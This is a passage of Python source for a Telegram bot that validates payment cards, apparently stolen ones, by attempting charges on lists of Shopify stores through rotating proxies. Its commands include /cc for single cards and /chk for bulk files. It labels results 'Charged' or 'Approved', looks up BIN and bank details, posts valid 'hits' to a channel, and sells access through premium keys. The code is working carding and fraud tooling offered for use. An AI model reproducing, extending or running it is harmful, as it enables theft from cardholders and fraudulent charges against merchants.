└─ <code>/stats</code> → Sʜᴏᴡ ʙᴏᴛ sᴛᴀᴛɪsᴛɪᴄs

🔧 <b>Hɪᴛs Mᴀɴᴀɢᴇᴍᴇɴᴛ</b>
├─ <code>/sethits ᴄʜᴀɴɴᴇʟ_ɪᴅ</code> → Sᴇᴛ ʜɪᴛs ᴄʜᴀɴɴᴇʟ
└─ <code>/hits</code> → Tᴏɢɢʟᴇ ʜɪᴛs ᴏɴ/ᴏғғ"""
    buttons = [[Button.inline(" Bᴀᴄᴋ", b"main_menu", style="danger", icon=5445365692004071819)]]
    await event.edit(premium_emoji(admin_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(data=b"main_menu"))
async def main_menu_callback(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else "User"
    except:
        username = "User"
    
    is_prem = is_premium(user_id)
    plan = "🆓 Fʀᴇᴇ" if not is_prem else "⭐ Pʀᴇᴍɪᴜᴍ"
    
    sites_data = await load_sites_with_price()
    total_sites = len(sites_data)
    
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    
    filter_text = ""
    for f in gateway_filters:
        if f.get('all', False):
            count = total_sites
        else:
            count = len([s for s in sites_data if f['min'] <= s.get('price', 0) < f['max']])
        filter_text += f"   ┣ {f['name']}  {count}\n"
    
    welcome_text = f"""Wᴇʟᴄᴏᴍᴇ @{username}!
👑 Pʟᴀɴ: {plan}
💰 Fɪʟᴛᴇʀs:
{filter_text}

🎁 Hᴏᴡ ᴛᴏ ᴜsᴇ:
   🦉 /addproxy
   🦉 /cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ
   🔑 /redeem Kᴇʏ

💡 Bᴏᴛ Dᴇᴠ @yacine_X6
 Vᴇʀsɪᴏɴ -» 2.0 🚀
﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏﹏"""
    
    buttons = get_main_menu_keyboard(user_id)
    await event.edit(premium_emoji(welcome_text), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=rb"price_fltr:(\d+):(\d+)"))
async def price_filter_callback(event):
    match = event.pattern_match
    filter_index = int(match.group(1).decode())
    user_id = int(match.group(2).decode())
    if event.sender_id != user_id:
        await event.answer("❌ Nᴏᴛ ʏᴏᴜʀ ғɪʟᴇ!", alert=True)
        return
    if user_id not in TEMP_FILE_DATA:
        await event.edit(premium_emoji("❌ Fɪʟᴇ ɴᴏᴛ ғᴏᴜɴᴅ! Pʟᴇᴀsᴇ ᴜᴘʟᴏᴀᴅ ᴀɢᴀɪɴ."), parse_mode='html')
        return
    filters = await load_price_filters()
    gateway_filters = filters.get('shopify_global', DEFAULT_FILTERS)
    if filter_index >= len(gateway_filters):
        await event.answer("❌ Iɴᴠᴀʟɪᴅ ғɪʟᴛᴇʀ!", alert=True)
        return
    selected_filter = gateway_filters[filter_index]
    file_data = TEMP_FILE_DATA.pop(user_id)
    cards = file_data['cards']
    file_path = file_data['file_path']
    if os.path.exists(file_path):
        try:
            os.remove(file_path)
        except:
            pass
    sites_data = await load_sites_with_price()
    if not sites_data:
        await event.edit(premium_emoji("❌ Nᴏ sɪᴛᴇs ғᴏᴜɴᴅ ᴡɪᴛʜ ᴘʀɪᴄᴇs! Rᴜɴ /sɪᴛᴇ ғɪʀsᴛ."), parse_mode='html')
        return
    if not selected_filter.get('all', False):
        filtered_sites = []
        for s in sites_data:
            price = s.get('price', 0)
            if selected_filter['min'] <= price < selected_filter['max']:
                filtered_sites.append(s['url'])
        sites_to_use = filtered_sites
    else:
        sites_to_use = [s['url'] for s in sites_data]
    if not sites_to_use:
        await event.edit(premium_emoji(f"❌ Nᴏ sɪᴛᴇs ғᴏᴜɴᴅ ɪɴ ʀᴀɴɢᴇ {selected_filter['name']}!"), parse_mode='html')
        return
    await event.edit(premium_emoji(f"🚀 Sᴛᴀʀᴛɪɴɢ ᴄʜᴇᴄᴋ ᴡɪᴛʜ ғɪʟᴛᴇʀ: {selected_filter['name']}\n\n📊 Sɪᴛᴇs: {len(sites_to_use)}\n💳 Cᴀʀᴅs: {len(cards)}"), parse_mode='html')
    await start_mass_check(user_id, cards, sites_to_use, event)
    await event.answer(f"✅ Sᴛᴀʀᴛᴇᴅ ᴄʜᴇᴄᴋ ᴡɪᴛʜ {len(sites_to_use)} sɪᴛᴇs!", alert=False)

@bot.on(events.CallbackQuery(data=b"cancel_filter"))
async def cancel_filter_callback(event):
    user_id = event.sender_id
    if user_id in TEMP_FILE_DATA:
        file_data = TEMP_FILE_DATA.pop(user_id)
        if os.path.exists(file_data['file_path']):
            try:
                os.remove(file_data['file_path'])
            except:
                pass
    await event.edit(premium_emoji("❌ Cᴀɴᴄᴇʟʟᴇᴅ."), parse_mode='html')
    await event.answer("✅ Cᴀɴᴄᴇʟʟᴇᴅ", alert=True)

@bot.on(events.NewMessage(pattern=r'/cc\s+'))
async def single_cc_check(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ."), parse_mode='html')
        return
    sites = load_sites()
    proxies = load_proxies()
    if not sites:
        await event.reply(premium_emoji("❌ Nᴏ sɪᴛᴇs ᴀᴠᴀɪʟᴀʙʟᴇ. Pʟᴇᴀsᴇ ᴄᴏɴᴛᴀᴄᴛ ᴀᴅᴍɪɴ."), parse_mode='html')
        return
    if not proxies:
        await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴀᴠᴀɪʟᴀʙʟᴇ. Pʟᴇᴀsᴇ ᴀᴅᴅ ᴘʀᴏxɪᴇs."), parse_mode='html')
        return
    cc_input = event.message.text.split(' ', 1)[1].strip()
    cards = extract_cc(cc_input)
    if not cards:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ CC ғᴏʀᴍᴀᴛ. Usᴇ: <code>/cc ᴄᴀʀᴅ|ᴍᴍ|ʏʏ|ᴄᴠᴠ</code>"), parse_mode='html')
        return
    card = cards[0]
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ <code>{card}</code>..."), parse_mode='html')
    try:
        result = await check_card_with_retry(card, sites, proxies, max_retries=3)
        brand, bin_type, level, bank, country, flag = await get_bin_info(card.split('|')[0])
        if result['status'] == 'Charged':
            status_header = "💎 CHARGED"
        elif result['status'] == 'Approved':
            status_header = "✅ APPROVED"
        else:
            status_header = "❌ DECLINED"
        final_resp = f"""{status_header}

💳 CC <code>{result['card']}</code>

🛒 Gᴀᴛᴇᴡᴀʏ {result.get('gateway', 'Unknown')}
📝 Rᴇsᴘᴏɴsᴇ {result['message'][:150]}
💸 Pʀɪᴄᴇ {result.get('price', '-')}

🆔 BIN Iɴғᴏ {brand} - {bin_type} - {level}
🏦 Bᴀɴᴋ {bank}
🥰 Cᴏᴜɴᴛʀʏ {country} {flag}

💡 Mᴀᴅᴇ ʙʏ @yacine_X6"""
        if 'Charged' in status_header or 'APPROVED' in status_header:
            await send_hit_to_channel(result['card'], result['status'], result['message'], result.get('gateway', 'Unknown'), result.get('price', '-'))
        await status_msg.edit(premium_emoji(final_resp), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/chk'))
async def check_command(event):
    user_id = event.sender_id
    try:
        sender = await event.get_sender()
        username = sender.username if sender.username else f"user_{user_id}"
    except:
        username = f"user_{user_id}"
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs ʙᴏᴛ."), parse_mode='html')
        return
    await process_file_with_filters(event, user_id)

@bot.on(events.NewMessage(pattern='/addproxy'))
async def add_proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    try:
        args = event.message.text.split('\n')
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/addproxy</code> ғᴏʟʟᴏᴡᴇᴅ ʙʏ ᴘʀᴏxɪᴇs, ᴏɴᴇ ᴘᴇʀ ʟɪɴᴇ."), parse_mode='html')
            return
        proxies_to_add = [line.strip() for line in args[1:] if line.strip()]
        if not proxies_to_add:
            await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴘʀᴏᴠɪᴅᴇᴅ."), parse_mode='html')
            return
        current_proxies = load_proxies()
        new_proxies = [p for p in proxies_to_add if p not in current_proxies]
        if not new_proxies:
            await event.reply(premium_emoji("⚠️ Aʟʟ ᴘʀᴏxɪᴇs ᴀʟʀᴇᴀᴅʏ ᴇxɪsᴛ."), parse_mode='html')
            return
        async with aiofiles.open(PROXY_FILE, 'a') as f:
            for proxy in new_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"✅ Aᴅᴅᴇᴅ {len(new_proxies)} ᴘʀᴏxɪᴇs!"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/proxy'))
async def proxy_command(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ ᴘʀᴏxʏ.ᴛxᴛ ɪs ᴇᴍᴘᴛʏ."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ {len(proxies)} ᴘʀᴏxɪᴇs..."), parse_mode='html')
    alive_proxies = []
    dead_proxies = []
    batch_size = 50
    try:
        for i in range(0, len(proxies), batch_size):
            batch = proxies[i:i + batch_size]
            tasks = [test_proxy(proxy) for proxy in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_proxies.append(res['proxy'])
                else:
                    dead_proxies.append(res['proxy'])
            await status_msg.edit(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ ᴘʀᴏxɪᴇs...\n\nCʜᴇᴄᴋᴇᴅ: {len(alive_proxies) + len(dead_proxies)}/{len(proxies)}\nAʟɪᴠᴇ: {len(alive_proxies)}\nDᴇᴀᴅ: {len(dead_proxies)}"), parse_mode='html')
        async with aiofiles.open(PROXY_FILE, 'w') as f:
            for proxy in alive_proxies:
                await f.write(f"{proxy}\n")
        await status_msg.edit(premium_emoji(f"✅ Pʀᴏxʏ ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\nTᴏᴛᴀʟ: {len(proxies)}\nAʟɪᴠᴇ: {len(alive_proxies)}\nRᴇᴍᴏᴠᴇᴅ: {len(dead_proxies)}"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/chkproxy\s+'))
async def check_single_proxy(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    proxy = event.message.text.split(' ', 1)[1].strip()
    if not proxy:
        await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/chkproxy ɪᴘ:ᴘᴏʀᴛ:ᴜsᴇʀ:ᴘᴀss</code>"), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ ᴘʀᴏxʏ: <code>{proxy}</code>..."), parse_mode='html')
    try:
        result = await test_proxy(proxy)
        if result['status'] == 'alive':
            await status_msg.edit(premium_emoji(f"✅ Pʀᴏxʏ ɪs ALIVE!\n\n<code>{proxy}</code>"), parse_mode='html')
        else:
            await status_msg.edit(premium_emoji(f"❌ Pʀᴏxʏ ɪs DEAD!\n\n<code>{proxy}</code>"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxy\s+'))
async def remove_single_proxy(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    proxy_to_remove = event.message.text.split(' ', 1)[1].strip()
    if not proxy_to_remove:
        await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/rmproxy ɪᴘ:ᴘᴏʀᴛ:ᴜsᴇʀ:ᴘᴀss</code>"), parse_mode='html')
        return
    current_proxies = load_proxies()
    if proxy_to_remove not in current_proxies:
        await event.reply(premium_emoji(f"❌ Pʀᴏxʏ ɴᴏᴛ ғᴏᴜɴᴅ: <code>{proxy_to_remove}</code>"), parse_mode='html')
        return
    new_proxies = [p for p in current_proxies if p != proxy_to_remove]
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    await event.reply(premium_emoji(f"✅ Pʀᴏxʏ ʀᴇᴍᴏᴠᴇᴅ!\n\n<code>{proxy_to_remove}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rmproxyindex\s+'))
async def remove_proxy_by_index(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    indices_str = event.message.text.split(' ', 1)[1].strip()
    if not indices_str:
        await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/rmproxyindex 1,2,3</code>"), parse_mode='html')
        return
    try:
        indices = [int(i.strip()) - 1 for i in indices_str.split(',')]
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ɪɴᴅɪᴄᴇs. Usᴇ ɴᴜᴍʙᴇʀs sᴇᴘᴀʀᴀᴛᴇᴅ ʙʏ ᴄᴏᴍᴍᴀs."), parse_mode='html')
        return
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ɪɴ ᴘʀᴏxʏ.ᴛxᴛ"), parse_mode='html')
        return
    removed = []
    new_proxies = []
    for i, proxy in enumerate(current_proxies):
        if i in indices:
            removed.append(proxy)
        else:
            new_proxies.append(proxy)
    if not removed:
        await event.reply(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ ɪɴᴅɪᴄᴇs ғᴏᴜɴᴅ."), parse_mode='html')
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        for proxy in new_proxies:
            await f.write(f"{proxy}\n")
    removed_text = "\n".join(removed[:10])
    await event.reply(premium_emoji(f"✅ Rᴇᴍᴏᴠᴇᴅ {len(removed)} ᴘʀᴏxɪᴇs!\n\nRᴇᴍᴏᴠᴇᴅ:\n<code>{removed_text}</code>"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/clearproxy'))
async def clear_all_proxies(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    current_proxies = load_proxies()
    count = len(current_proxies)
    if count == 0:
        await event.reply(premium_emoji("❌ ᴘʀᴏxʏ.ᴛxᴛ ɪs ᴀʟʀᴇᴀᴅʏ ᴇᴍᴘᴛʏ."), parse_mode='html')
        return
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    backup_filename = f"proxy_backup_{user_id}_{timestamp}.txt"
    try:
        async with aiofiles.open(backup_filename, 'w') as f:
            for proxy in current_proxies:
                await f.write(f"{proxy}\n")
        await event.reply(premium_emoji(f"📦 Bᴀᴄᴋᴜᴘ ᴄʀᴇᴀᴛᴇᴅ!\n\nSᴇɴᴅɪɴɢ ʙᴀᴄᴋᴜᴘ ᴏғ {count} ᴘʀᴏxɪᴇs..."), file=backup_filename, parse_mode='html')
        try:
            os.remove(backup_filename)
        except:
            pass
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ ᴄʀᴇᴀᴛɪɴɢ ʙᴀᴄᴋᴜᴘ: {e}"), parse_mode='html')
        return
    async with aiofiles.open(PROXY_FILE, 'w') as f:
        await f.write("")
    await event.reply(premium_emoji(f"✅ Cʟᴇᴀʀᴇᴅ ᴀʟʟ {count} ᴘʀᴏxɪᴇs!\n\nᴘʀᴏxʏ.ᴛxᴛ ɪs ɴᴏᴡ ᴇᴍᴘᴛʏ."), parse_mode='html')

@bot.on(events.NewMessage(pattern='/getproxy'))
async def get_all_proxies(event):
    user_id = event.sender_id
    if not is_premium(user_id):
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ\n\nOɴʟʏ ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀs ᴄᴀɴ ᴜsᴇ ᴛʜɪs."), parse_mode='html')
        return
    current_proxies = load_proxies()
    if not current_proxies:
        await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ɪɴ ᴘʀᴏxʏ.ᴛxᴛ"), parse_mode='html')
        return
    if len(current_proxies) <= 50:
        proxy_list = "\n".join([f"{i+1}. <code>{p}</code>" for i, p in enumerate(current_proxies)])
        await event.reply(premium_emoji(f"📋 Aʟʟ Pʀᴏxɪᴇs ({len(current_proxies)}):\n\n{proxy_list}"), parse_mode='html')
    else:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"proxies_{user_id}_{timestamp}.txt"
        async with aiofiles.open(filename, 'w') as f:
            for i, proxy in enumerate(current_proxies):
                await f.write(f"{i+1}. {proxy}\n")
        await event.reply(premium_emoji(f"📋 Aʟʟ Pʀᴏxɪᴇs ({len(current_proxies)}):\n\nFɪʟᴇ ᴀᴛᴛᴀᴄʜᴇᴅ ʙᴇʟᴏᴡ."), file=filename, parse_mode='html')
        try:
            os.remove(filename)
        except:
            pass

@bot.on(events.NewMessage(pattern='/site'))
async def site_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    sites = load_sites()
    if not sites:
        await event.reply(premium_emoji("❌ sɪᴛᴇs.ᴛxᴛ ɪs ᴇᴍᴘᴛʏ."), parse_mode='html')
        return
    proxies = load_proxies()
    if not proxies:
        await event.reply(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴀᴠᴀɪʟᴀʙʟᴇ."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ {len(sites)} sɪᴛᴇs..."), parse_mode='html')
    alive_sites = []
    dead_sites = []
    sites_with_price = []
    batch_size = 10
    try:
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            fresh_proxies = load_proxies()
            if not fresh_proxies:
                fresh_proxies = proxies
            tasks = [test_site_with_price(site, random.choice(fresh_proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                    sites_with_price.append({'url': res['site'], 'price': res.get('price', 0.0)})
                else:
                    dead_sites.append(res['site'])
            await status_msg.edit(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ sɪᴛᴇs...\n\nCʜᴇᴄᴋᴇᴅ: {len(alive_sites) + len(dead_sites)}/{len(sites)}\nAʟɪᴠᴇ: {len(alive_sites)}\nDᴇᴀᴅ: {len(dead_sites)}"), parse_mode='html')
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        await save_sites_with_price(sites_with_price)
        await status_msg.edit(premium_emoji(f"✅ Sɪᴛᴇ ᴄʜᴇᴄᴋ ᴄᴏᴍᴘʟᴇᴛᴇ!\n\nTᴏᴛᴀʟ: {len(sites)}\nAʟɪᴠᴇ: {len(alive_sites)}\nRᴇᴍᴏᴠᴇᴅ: {len(dead_sites)}"), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern=r'/rm\s+'))
async def remove_site_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        url_to_remove = event.message.text.split(' ', 1)[1].strip()
        if not url_to_remove:
            await event.reply(premium_emoji("❌ Usᴀɢᴇ: <code>/rm ʜᴛᴛᴘs://sɪᴛᴇ.ᴄᴏᴍ</code>"), parse_mode='html')
            return
        current_sites = load_sites()
        if url_to_remove not in current_sites:
            await event.reply(premium_emoji(f"❌ Sɪᴛᴇ ɴᴏᴛ ғᴏᴜɴᴅ: <code>{url_to_remove}</code>"), parse_mode='html')
            return
        new_sites = [site for site in current_sites if site != url_to_remove]
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in new_sites:
                await f.write(f"{site}\n")
        await event.reply(premium_emoji(f"✅ Sɪᴛᴇ ʀᴇᴍᴏᴠᴇᴅ!\n\n<code>{url_to_remove}</code>"), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addsites'))
async def add_sites_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("📝 Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ ᴡɪᴛʜ ᴛʜᴇ ᴄᴏᴍᴍᴀɴᴅ:\n<code>/addsites</code>"), parse_mode='html')
        return
    reply_msg = await event.get_reply_message()
    if not reply_msg.file or not reply_msg.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Pʟᴇᴀsᴇ ʀᴇᴘʟʏ ᴛᴏ ᴀ .ᴛxᴛ ғɪʟᴇ."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("🔄 Pʀᴏᴄᴇssɪɴɢ sɪᴛᴇs ғɪʟᴇ..."), parse_mode='html')
    try:
        file_path = await reply_msg.download_media()
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
            sites = [line.strip() for line in content.splitlines() if line.strip()]
        os.remove(file_path)
        if not sites:
            await status_msg.edit(premium_emoji("❌ Nᴏ ᴠᴀʟɪᴅ sɪᴛᴇs ғᴏᴜɴᴅ ɪɴ ғɪʟᴇ."), parse_mode='html')
            return
        await status_msg.edit(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ {len(sites)} sɪᴛᴇs ʙᴇғᴏʀᴇ ᴀᴅᴅɪɴɢ..."), parse_mode='html')
        proxies = load_proxies()
        if not proxies:
            await status_msg.edit(premium_emoji("❌ Nᴏ ᴘʀᴏxɪᴇs ᴀᴠᴀɪʟᴀʙʟᴇ ᴛᴏ ᴛᴇsᴛ sɪᴛᴇs."), parse_mode='html')
            return
        alive_sites = []
        dead_sites = []
        sites_with_price = []
        batch_size = 10
        for i in range(0, len(sites), batch_size):
            batch = sites[i:i + batch_size]
            tasks = [test_site_with_price(site, random.choice(proxies)) for site in batch]
            results = await asyncio.gather(*tasks)
            for res in results:
                if res['status'] == 'alive':
                    alive_sites.append(res['site'])
                    sites_with_price.append({'url': res['site'], 'price': res.get('price', 0.0)})
                else:
                    dead_sites.append(res['site'])
            await status_msg.edit(premium_emoji(f"🔄 Cʜᴇᴄᴋɪɴɢ sɪᴛᴇs...\n\nCʜᴇᴄᴋᴇᴅ: {len(alive_sites) + len(dead_sites)}/{len(sites)}\n✅ Aʟɪᴠᴇ: {len(alive_sites)}\n❌ Dᴇᴀᴅ: {len(dead_sites)}"), parse_mode='html')
        async with aiofiles.open(SITES_FILE, 'w') as f:
            for site in alive_sites:
                await f.write(f"{site}\n")
        await save_sites_with_price(sites_with_price)
        result_text = f"""✅ <b>Sɪᴛᴇs ᴜᴘᴅᴀᴛᴇᴅ sᴜᴄᴄᴇssғᴜʟʟʏ!</b>

📊 Tᴏᴛᴀʟ sɪᴛᴇs ʀᴇᴄᴇɪᴠᴇᴅ: {len(sites)}
✅ Aʟɪᴠᴇ (ᴀᴅᴅᴇᴅ): {len(alive_sites)}
❌ Dᴇᴀᴅ (ɪɢɴᴏʀᴇᴅ): {len(dead_sites)}

🌐 <b>Aᴅᴅᴇᴅ sɪᴛᴇs:</b>
{chr(10).join([f"• {s}" for s in alive_sites[:5]])}{'...' if len(alive_sites) > 5 else ''}"""
        await status_msg.edit(premium_emoji(result_text), parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/addpremium'))
async def add_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/addpremium ᴜsᴇʀ_ɪᴅ</code>"), parse_mode='html')
            return
        target_id = int(parts[1])
        if await add_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ᴀᴅᴅᴇᴅ ᴛᴏ ᴘʀᴇᴍɪᴜᴍ!"), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji("🎉 Cᴏɴɢʀᴀᴛᴜʟᴀᴛɪᴏɴs! Yᴏᴜ ʜᴀᴠᴇ ʙᴇᴇɴ ɢʀᴀɴᴛᴇᴅ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ᴛᴏ ᴛʜᴇ ʙᴏᴛ!"), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"⚠️ Usᴇʀ <code>{target_id}</code> ɪs ᴀʟʀᴇᴀᴅʏ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID."), parse_mode='html')
    except Exception as e:
        await event.reply(premium_emoji(f"❌ Eʀʀᴏʀ: {e}"), parse_mode='html')

@bot.on(events.NewMessage(pattern='/removepremium'))
async def remove_premium_command(event):
    user_id = event.sender_id
    if user_id not in ADMIN_ID:
        await event.reply(premium_emoji("❌ Aᴄᴄᴇss Dᴇɴɪᴇᴅ. Aᴅᴍɪɴ ᴏɴʟʏ."), parse_mode='html')
        return
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            await event.reply(premium_emoji("📝 Usᴀɢᴇ: <code>/removepremium ᴜsᴇʀ_ɪᴅ</code>"), parse_mode='html')
            return
        target_id = int(parts[1])
        if target_id in ADMIN_ID:
            await event.reply(premium_emoji("⚠️ Cᴀɴɴᴏᴛ ʀᴇᴍᴏᴠᴇ ᴀᴅᴍɪɴ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
            return
        if await remove_premium_user(target_id):
            await event.reply(premium_emoji(f"✅ Usᴇʀ <code>{target_id}</code> ʀᴇᴍᴏᴠᴇᴅ ғʀᴏᴍ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
            try:
                await bot.send_message(target_id, premium_emoji("⚠️ Yᴏᴜʀ ᴘʀᴇᴍɪᴜᴍ ᴀᴄᴄᴇss ʜᴀs ʙᴇᴇɴ ʀᴇᴠᴏᴋᴇᴅ."), parse_mode='html')
            except:
                pass
        else:
            await event.reply(premium_emoji(f"⚠️ Usᴇʀ <code>{target_id}</code> ɪs ɴᴏᴛ ᴘʀᴇᴍɪᴜᴍ."), parse_mode='html')
    except ValueError:
        await event.reply(premium_emoji("❌ Iɴᴠᴀʟɪᴅ ᴜsᴇʀ ID."), parse_mode='html')
    except Exception as e:
